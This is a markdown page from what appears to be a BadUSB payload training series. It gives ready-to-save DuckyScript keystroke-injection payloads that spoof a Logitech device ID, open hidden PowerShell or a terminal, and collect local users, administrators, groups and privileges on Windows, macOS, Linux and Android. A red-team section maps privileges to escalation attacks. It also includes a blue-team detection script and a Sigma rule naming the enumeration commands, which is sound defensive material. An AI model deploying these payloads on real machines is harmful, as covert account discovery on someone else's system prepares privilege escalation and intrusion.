# FZ-I05: User Enumeration

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-I05 |
| **Name** | User Enumeration |
| **Difficulty** | Intermediate |
| **Target OS** | Windows 10/11 |
| **Execution Time** | ~8 seconds |
| **Output** | %TEMP%\users.txt |
| **MITRE ATT&CK** | T1087 (Account Discovery) |

## What This Payload Does

Enumerates local users, groups, and group memberships on a Windows system. Identifies administrators, domain membership, and user privileges essential for privilege escalation planning.

---

## The Payload

```ducky
REM =============================================
REM INTERMEDIATE: User Enumeration
REM Target: Windows 10/11
REM Action: Lists users and groups
REM Output: %TEMP%\users.txt
REM Skill: Intermediate
REM =============================================

ID 046d:c52b Logitech:Unifying Receiver

DELAY 2500

REM Open hidden PowerShell
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1500

REM Enumerate users and groups
STRINGLN $u = @()
STRINGLN $u += "=== USER ENUMERATION ==="
STRINGLN $u += "Generated: $(Get-Date)"
STRINGLN $u += "Current User: $env:USERNAME"
STRINGLN $u += "Domain: $env:USERDOMAIN"
STRINGLN $u += ""

REM Local Users
STRINGLN $u += "=== LOCAL USERS ==="
STRINGLN $u += (Get-LocalUser | Select Name, Enabled, LastLogon | Format-Table | Out-String)

REM Local Groups
STRINGLN $u += "=== LOCAL GROUPS ==="
STRINGLN $u += (Get-LocalGroup | Select Name | Out-String)

REM Administrators
STRINGLN $u += "=== ADMINISTRATORS ==="
STRINGLN $u += (Get-LocalGroupMember -Group "Administrators" | Out-String)

REM Current User Groups
STRINGLN $u += "=== CURRENT USER GROUPS ==="
STRINGLN $u += (whoami /groups | Out-String)

REM Current User Privileges
STRINGLN $u += "=== CURRENT USER PRIVILEGES ==="
STRINGLN $u += (whoami /priv | Out-String)

STRINGLN $u | Out-File "$env:TEMP\users.txt"
STRINGLN exit
```

---

## Information Gathered

### User Account Details

| Data Point | Intelligence Value |
|------------|-------------------|
| Username | Account targeting |
| Enabled Status | Active accounts |
| Last Logon | Active user identification |
| Group Membership | Privilege level |
| Admin Members | High-value targets |

### Sample Output

```
=== LOCAL USERS ===
Name            Enabled LastLogon
----            ------- ---------
Administrator   False
DefaultAccount  False
Guest           False
john.doe        True    12/28/2025 9:00:00 AM
WDAGUtilityAccount False

=== ADMINISTRATORS ===
ObjectClass Name                       PrincipalSource
----------- ----                       ---------------
User        DESKTOP\Administrator      Local
User        DESKTOP\john.doe           Local
Group       CONTOSO\Domain Admins      ActiveDirectory

=== CURRENT USER PRIVILEGES ===
SeShutdownPrivilege               Shut down the system              Disabled
SeChangeNotifyPrivilege           Bypass traverse checking          Enabled
SeIncreaseWorkingSetPrivilege     Increase a process working set    Disabled
```

---

## Cross-Platform Versions

### macOS

```ducky
DELAY 2500
GUI SPACE
DELAY 700
STRING terminal
ENTER
DELAY 1500
STRINGLN {
STRINGLN echo "=== USER ENUMERATION ===" > /tmp/users.txt
STRINGLN echo "Current User: $(whoami)" >> /tmp/users.txt
STRINGLN echo "" >> /tmp/users.txt
STRINGLN echo "=== ALL USERS ===" >> /tmp/users.txt
STRINGLN dscl . list /Users | grep -v '^_' >> /tmp/users.txt
STRINGLN echo "" >> /tmp/users.txt
STRINGLN echo "=== ADMIN USERS ===" >> /tmp/users.txt
STRINGLN dscacheutil -q group -a name admin >> /tmp/users.txt
STRINGLN echo "" >> /tmp/users.txt
STRINGLN echo "=== CURRENT USER GROUPS ===" >> /tmp/users.txt
STRINGLN groups >> /tmp/users.txt
STRINGLN echo "" >> /tmp/users.txt
STRINGLN echo "=== LAST LOGINS ===" >> /tmp/users.txt
STRINGLN last | head -20 >> /tmp/users.txt
STRINGLN } 2>/dev/null
```

### Linux

```ducky
DELAY 2500
CTRL ALT t
DELAY 1000
STRINGLN {
STRINGLN echo "=== USER ENUMERATION ===" > /tmp/users.txt
STRINGLN echo "Current User: $(whoami)" >> /tmp/users.txt
STRINGLN echo "User ID: $(id)" >> /tmp/users.txt
STRINGLN echo "" >> /tmp/users.txt
STRINGLN echo "=== USERS (passwd) ===" >> /tmp/users.txt
STRINGLN cat /etc/passwd | grep -v nologin | grep -v false >> /tmp/users.txt
STRINGLN echo "" >> /tmp/users.txt
STRINGLN echo "=== SUDO USERS ===" >> /tmp/users.txt
STRINGLN getent group sudo 2>/dev/null >> /tmp/users.txt
STRINGLN getent group wheel 2>/dev/null >> /tmp/users.txt
STRINGLN echo "" >> /tmp/users.txt
STRINGLN echo "=== LOGGED IN USERS ===" >> /tmp/users.txt
STRINGLN who >> /tmp/users.txt
STRINGLN echo "" >> /tmp/users.txt
STRINGLN echo "=== LAST LOGINS ===" >> /tmp/users.txt
STRINGLN last | head -20 >> /tmp/users.txt
STRINGLN } 2>/dev/null
```

### Android (via Termux)

```ducky
DELAY 4000
GUI
DELAY 1000
STRING termux
ENTER
DELAY 3000
STRINGLN echo "=== ANDROID USER INFO ===" > /sdcard/users.txt
STRINGLN echo "User: $(whoami)" >> /sdcard/users.txt
STRINGLN id >> /sdcard/users.txt
STRINGLN echo "User ID:" >> /sdcard/users.txt
STRINGLN cat /proc/self/status | grep -i uid >> /sdcard/users.txt
REM Full user enumeration requires root
STRINGLN su -c "pm list users" >> /sdcard/users.txt 2>/dev/null
```

### iOS

iOS does not expose user enumeration capabilities via BadUSB. The system runs as a single user with sandboxed apps.

---

## Key Windows Commands

| Command | Information |
|---------|-------------|
| `Get-LocalUser` | All local user accounts |
| `Get-LocalGroup` | All local groups |
| `Get-LocalGroupMember` | Members of specific group |
| `whoami /all` | Current user full info |
| `whoami /groups` | Group memberships |
| `whoami /priv` | User privileges |
| `net user` | Classic user listing |
| `net localgroup` | Classic group listing |

### Domain Commands (If Domain-Joined)

```powershell
# Domain users
Get-ADUser -Filter * | Select Name, Enabled

# Domain admins
Get-ADGroupMember "Domain Admins"

# Current domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

---

## Red Team Perspective

### Account Types to Target

| Account Type | Value |
|--------------|-------|
| Local Admin | System access |
| Domain Admin | Enterprise access |
| Service Accounts | Often over-privileged |
| Disabled Admins | May be re-enabled |
| Recent Logins | Active users |

### Privilege Escalation Indicators

```
SeImpersonatePrivilege    → Potato attacks
SeAssignPrimaryToken      → Token manipulation
SeBackupPrivilege         → Backup operator abuse
SeRestorePrivilege        → Restore file permissions
SeDebugPrivilege          → Process injection
SeTakeOwnershipPrivilege  → Take file ownership
```

### Attack Chain

```
User Enum → Privilege Analysis → Escalation Path → Admin Access
     ↑
 You are here
```

---

## Blue Team Perspective

### Detection Opportunities

1. **Account Enumeration**
   - Get-LocalUser, net user commands
   - Access to SAM database

2. **Group Queries**
   - Querying Administrators group
   - Domain group enumeration

3. **Privilege Queries**
   - whoami /priv execution
   - Token privilege inspection

### Detection Script

```powershell
# Detect user enumeration
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    Id=4688
} -MaxEvents 1000 | Where-Object {
    $_.Message -match 'whoami|Get-LocalUser|net user|Get-LocalGroup'
} | Select TimeCreated, @{N='Command';E={($_.Message -split "`n" | Select-String 'Command Line').Line}}
```

### Sigma Rule

```yaml
title: Local Account Enumeration
status: experimental
description: Detects enumeration of local user accounts and groups
logsource:
    product: windows
    category: process_creation
detection:
    selection_tools:
        CommandLine|contains:
            - 'Get-LocalUser'
            - 'Get-LocalGroup'
            - 'Get-LocalGroupMember'
            - 'whoami /groups'
            - 'whoami /priv'
            - 'net user'
            - 'net localgroup'
    condition: selection_tools
level: medium
tags:
    - attack.discovery
    - attack.t1087.001
```

### Prevention

1. **Least Privilege**
   - Remove unnecessary admin rights
   - Implement tiered admin model

2. **Monitoring**
   - Alert on admin group queries
   - Track account enumeration

3. **Access Control**
   - Restrict who can query accounts
   - Audit sensitive operations

---

## Practice Exercises

### Exercise 1: Find Admin Count
Count members of Administrators group:
```ducky
STRINGLN (Get-LocalGroupMember -Group "Administrators").Count
```

### Exercise 2: Check Admin Status
Check if current user is admin:
```ducky
STRINGLN ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
```

### Exercise 3: Find Service Accounts
List accounts that might be service accounts:
```ducky
STRINGLN Get-LocalUser | Where-Object { $_.Name -match 'svc|service|sql|iis' }
```

### Exercise 4: Password Policy
Get local password policy:
```ducky
STRINGLN net accounts
```

---

## Payload File

Save as `FZ-I05_User_Enumeration.txt`:

```ducky
REM FZ-I05: User Enumeration
ID 046d:c52b Logitech:Unifying Receiver
DELAY 2500
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1500
STRINGLN $u=@("User:$env:USERNAME","Domain:$env:USERDOMAIN","");$u+="=USERS=";$u+=(Get-LocalUser|Select Name,Enabled|Out-String);$u+="=ADMINS=";$u+=(Get-LocalGroupMember "Administrators"|Out-String);$u+=(whoami /groups);$u|Out-File "$env:TEMP\users.txt";exit
```

---

[← FZ-I04 Network Reconnaissance](FZ-I04_Network_Reconnaissance.md) | [Back to Intermediate](README.md) | [Next: FZ-I06 Scheduled Task Persistence →](FZ-I06_Scheduled_Task_Persistence.md)
